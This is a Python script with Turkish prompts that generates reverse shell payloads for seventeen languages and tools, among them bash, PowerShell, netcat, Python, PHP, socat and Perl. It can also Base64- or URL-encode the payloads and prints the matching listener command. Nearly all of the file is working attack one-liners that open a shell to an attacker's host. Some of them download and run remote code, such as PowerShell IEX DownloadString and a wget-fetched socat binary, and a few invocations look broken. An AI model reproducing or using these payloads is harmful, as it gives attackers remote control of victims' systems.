#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import base64
import random
import string
from urllib.parse import quote

def print_banner():
    banner = """
    ╔══════════════════════════════════════╗
    ║           SHELL GENERATOR            ║
    ╚══════════════════════════════════════╝
    """
    print(banner)

def get_input():
    print("\nShell türleri:")
    print("1. Bash")
    print("2. PowerShell (Windows)")
    print("3. Netcat (nc)")
    print("4. Python")
    print("5. PHP")
    print("6. Socat")
    print("7. Ruby")
    print("8. Perl")
    print("9. Golang")
    print("10. AWK")
    print("11. Telnet")
    print("12. Java")
    print("13. Lua")
    print("14. Node.js")
    print("15. OpenSSL")
    print("16. Dart")
    print("17. Groovy")

    try:
        choice = int(input("\nShell türü seç (1-17): "))
        if choice < 1 or choice > 17:
            print("Geçersiz seçim!")
            sys.exit(1)
    except ValueError:
        print("Lütfen geçerli bir sayı gir!")
        sys.exit(1)

    ip = input("Listener IP: ")
    port = input("Listener port: ")

    payload_options = {}
    if choice == 1:
        print("\nBash payload seçenekleri: 1-Standart 2-/dev/tcp 3-UDP 4-mkfifo 5-Exec")
        payload_options['bash'] = input("Seçim (1-5, varsayılan 1): ") or "1"
    elif choice == 2:
        print("\nPowerShell payload seçenekleri: 1-Standart 2-One-liner 3-Base64 4-DownloadString 5-Nishang")
        payload_options['ps'] = input("Seçim (1-5, varsayılan 1): ") or "1"
    elif choice == 3:
        print("\nNetcat payload seçenekleri: 1-nc -e 2-mkfifo 3-no -e 4-busybox 5-ncat")
        payload_options['nc'] = input("Seçim (1-5, varsayılan 1): ") or "1"
    elif choice == 4:
        print("\nPython payload seçenekleri: 1-socket+subprocess 2-pty.spawn 3-subprocess only 4-Windows 5-Web Server")
        payload_options['python'] = input("Seçim (1-5, varsayılan 1): ") or "1"
    elif choice == 5:
        print("\nPHP payload seçenekleri: 1-exec 2-shell_exec 3-system 4-passthru 5-pcntl_exec")
        payload_options['php'] = input("Seçim (1-5, varsayılan 1): ") or "1"
    elif choice == 7:
        print("\nRuby payload seçenekleri: 1-Standart 2-Fork 3-File Descriptor")
        payload_options['ruby'] = input("Seçim (1-3, varsayılan 1): ") or "1"
    elif choice == 8:
        print("\nPerl payload seçenekleri: 1-Socket 2-IO::Socket 3-Windows 4-System")
        payload_options['perl'] = input("Seçim (1-4, varsayılan 1): ") or "1"
    elif choice == 9:
        print("\nGolang payload seçenekleri: 1-Standart 2-Exec")
        payload_options['go'] = input("Seçim (1-2, varsayılan 1): ") or "1"
    elif choice == 12:
        print("\nJava payload seçenekleri: 1-Runtime.exec 2-ProcessBuilder")
        payload_options['java'] = input("Seçim (1-2, varsayılan 1): ") or "1"
    
    return choice, ip, port, payload_options

def encode_powershell(cmd):
    return base64.b64encode(cmd.encode("utf-16le")).decode()

def generate_shell(choice, ip, port, options):
    ps_payload = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);"
        f"$stream.Flush()}};$client.Close()"
    )

    rand_str = ''.join(random.choices(string.ascii_lowercase+string.digits, k=6))

    shells = {
        1: {'bash': [
            f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
            f"sh -i >& /dev/udp/{ip}/{port} 0>&1",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"
        ]},
        2: {'ps': [
            f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\"",
            f"powershell -e {encode_powershell(ps_payload)}",
            f"powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}",
            f"powershell -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('http://{ip}:8000/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}\""
        ]},
        3: {'nc': [
            f"nc -e /bin/sh {ip} {port}",
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
            f"nc {ip} {port} | /bin/sh | nc {ip} {port}",
            f"busybox nc {ip} {port} -e /bin/sh",
            f"ncat {ip} {port} -e /bin/sh"
        ]},
        4: {'python': [
            f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'",
            f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
            f"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"{ip}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
            f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"cmd.exe\",\"/k\"])'",
            f"python3 -m http.server {port} & python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"
        ]},
        5: {'php': [
            f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"php -r '$sock=fsockopen(\"{ip}\",{port});pcntl_exec(\"/bin/sh\", [\"-i\"]);'"
        ]},
        6: {'socat': [
            f"socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
            f"socat TCP:{ip}:{port} EXEC:'sh -li',pty,stderr,setsid,sigint,sane",
            f"socat TCP:{ip}:{port} EXEC:'cmd.exe',pipes",
            f"wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat{rand_str}; chmod +x /tmp/socat{rand_str}; /tmp/socat{rand_str} exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
            f"socat UDP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
        ]},
        7: {'ruby': [
            f"ruby -rsocket -e 'c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
            f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,\"r\"){{|io|c.print io.read}})) rescue c.puts \"failed: #{{$_}}\"}}'",
            f"ruby -rsocket -e 'f=TCPSocket.open(\"{ip}\",\"{port}\").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ]},
        8: {'perl': [
            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            f"perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);STDOUT->fdopen($c,w);STDERR->fdopen($c,w);system(\"/bin/sh -i\");'",
            f"perl -MIO::Socket -e '$c=IO::Socket::INET->new(PeerAddr=>\"{ip}\",PeerPort=>{port},Proto=>\"tcp\");while(<$c>){{system $_}}'",
            f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");system(\"/bin/sh -i\");}};'"
        ]},
        9: {'go': [
            f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/shell.go && go run /tmp/shell.go",
            f"go run -c 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"cmd.exe\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'"
        ]},
        10: {'awk': [
            f"awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{do{{printf \"shell>\" |& s; s |& getline c; if(c){{while ((c |& getline) > 0) print $0 |& s; close(c)}}}} while(c != \"exit\") close(s)}}}}'"
        ]},
        11: {'telnet': [
            f"telnet {ip} {port} | /bin/sh | telnet {ip} {port}",
            f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | /bin/sh 1>$TF"
        ]},
        12: {'java': [
            f"java -c 'public class ReverseShell {{public static void main(String[] args) {{try {{Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]{{\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"}});p.waitFor();}} catch (Exception e) {{}}}}'",
            f"java -c 'public class Shell {{public static void main(String[] args) {{try {{new ProcessBuilder(\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\").start();}} catch (Exception e) {{}}}}'"
        ]},
        13: {'lua': [
            f"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            f"lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'"
        ]},
        14: {'node': [
            f"node -e \"require('child_process').exec('nc -e /bin/sh {ip} {port}')\"",
            f"node -e \"const {{ spawn }} = require('child_process'); const client = require('net').connect({port}, '{ip}', () => {{ const sh = spawn('/bin/sh', []); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});\""
        ]},
        15: {'openssl': [
            f"openssl s_client -quiet -connect {ip}:{port}",
            f"mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"
        ]},
        16: {'dart': [
            f'dart -e \'import "dart:io";main(){{Socket.connect("{ip}",{port}).then((s){{Process.start("/bin/sh",[]).then((p){{s.listen(p.stdin.add);p.stdout.listen(s.add);p.stderr.listen(s.add);}});}});}}\''
        ]},
        17: {'groovy': [
            f'groovy -e \'import java.net.*; import java.io.*; Socket s=new Socket("{ip}",{port}); Process p=new ProcessBuilder("/bin/sh").redirectErrorStream(true).start(); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){{ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); }} s.close();\''
        ]}
    }

    if choice in shells:
        opt_key = list(shells[choice].keys())[0]
        if options and opt_key in options:
            opt_index = int(options[opt_key]) - 1
            if opt_index < len(shells[choice][opt_key]):
                return shells[choice][opt_key][opt_index]
        return shells[choice][opt_key][0]
    else:
        return "Seçilen shell için payload tanımlı değil."

def print_listener_command(port, ip, shell_type):
    print(f"\nDinleyici komutu (kendi makinende çalıştır):")
    if shell_type == 15:
        print(f"openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes")
        print(f"openssl s_server -quiet -key key.pem -cert cert.pem -port {port}")
    else:
        print(f"nc -nvlp {port}")

def main():
    print_banner()
    choice, ip, port, options = get_input()
    shell_code = generate_shell(choice, ip, port, options)

    print(f"\nOluşturulan reverse shell kodu:\n{shell_code}\n")

    if input("URL encode yapılsın mı? (y/N): ").lower() == 'y':
        print(f"\nURL Encoded:\n{quote(shell_code)}\n")

    if input("Base64 encode yapılsın mı? (y/N): ").lower() == 'y':
        print(f"\nBase64 Encoded:\n{base64.b64encode(shell_code.encode()).decode()}\n")

    print_listener_command(port, ip, choice)

    if input("Dosyaya kaydedilsin mi? (y/N): ").lower() == 'y':
        with open("shell.txt", "w") as f:
            f.write(shell_code)
        print("shell.txt dosyasına kaydedildi")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nİşlem iptal edildi")
        sys.exit(1)
